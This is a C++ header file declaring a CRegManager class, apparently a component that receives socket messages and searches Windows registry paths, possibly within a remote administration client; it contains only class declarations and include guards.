// RegManager.h: interface for the CRegManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_REGMANAGER_H__1B470138_66F4_49CA_B7E8_BA4C4E36CA3C__INCLUDED_)
#define AFX_REGMANAGER_H__1B470138_66F4_49CA_B7E8_BA4C4E36CA3C__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CRegManager : public CManager  
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CRegManager(CClientSocket *pClient);
	virtual ~CRegManager();
	void Find(char bToken,char* path);

};

#endif // !defined(AFX_REGMANAGER_H__1B470138_66F4_49CA_B7E8_BA4C4E36CA3C__INCLUDED_)
